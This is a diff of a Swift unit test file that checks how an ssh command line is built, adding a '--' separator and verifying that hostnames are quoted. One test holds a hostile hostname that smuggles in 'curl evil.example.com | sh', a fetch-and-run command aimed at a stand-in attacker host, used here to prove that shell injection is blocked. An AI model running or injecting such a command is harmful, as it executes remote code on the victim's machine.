@@ -95,19 +95,19 @@ final class SanitizeTests: XCTestCase {
         XCTAssertEqual(
             SSHCommand.line(target: "payments-prod-web-1", user: "rocky",
                             identityFile: "~/k.pem", managedByConfig: true),
-            "ssh 'payments-prod-web-1'")
+            "ssh -- 'payments-prod-web-1'")
     }
 
     func testUnmanagedHostSpellsOutUserAndKey() {
         XCTAssertEqual(
             SSHCommand.line(target: "web.example.com", user: "rocky",
                             identityFile: "~/k.pem", managedByConfig: false),
-            "ssh -i '~/k.pem' 'rocky@web.example.com'")
+            "ssh -i '~/k.pem' -- 'rocky@web.example.com'")
     }
 
     func testAHostileHostnameTagCannotEscapeIntoTheShell() {
         let line = SSHCommand.line(target: "web.example.com; curl evil.example.com | sh",
                                    user: nil, identityFile: nil, managedByConfig: false)
-        XCTAssertEqual(line, "ssh 'web.example.com; curl evil.example.com | sh'")
+        XCTAssertEqual(line, "ssh -- 'web.example.com; curl evil.example.com | sh'")
     }
 }
